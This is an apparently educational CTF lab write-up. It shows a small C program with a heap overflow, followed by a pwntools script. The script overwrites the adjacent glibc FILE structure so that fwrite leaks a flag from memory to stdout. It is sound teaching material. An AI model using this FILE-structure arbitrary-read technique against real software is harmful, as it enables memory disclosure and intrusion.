# Simple PWN 0x22(Lab - `AAR`)
###### tags: `CTF` `PWN` `eductf`

Version: Ubuntu 20.04

## Original Code
:::spoiler Original Code
```cpp=
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

char flag[0x10] = "FLAG{TEST}\n";

int main()
{
    FILE *fp;
    char *buf;

    buf = malloc(0x10);
    fp = fopen("/tmp/meow", "w");
    read(0, buf, 0x1000);
    fwrite(buf, 0x10, 1, fp);
    return 0;
}
```
:::

## Exploit - heap overflow + overlap flag
```python=
from pwn import *

# r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10010)

context.arch = 'amd64'

flag_addr = 0x404050

raw_input()
payload = flat(
    p64(0)*4,
    p64(0xfbad0800),        #_flags
    p64(0),                 #_IO_read_ptr
    p64(flag_addr),         #_IO_read_end
    p64(0),                 #_IO_read_base
    p64(flag_addr),         #_IO_write_base
    p64(flag_addr+0x10),    #_IO_write_ptr
    p64(0)*8,               #_IO_write_end + _IO_buf_base + _IO_buf_end + _chain
    p64(0x1)                #_fileno
)

r.send(payload)

r.interactive()
```
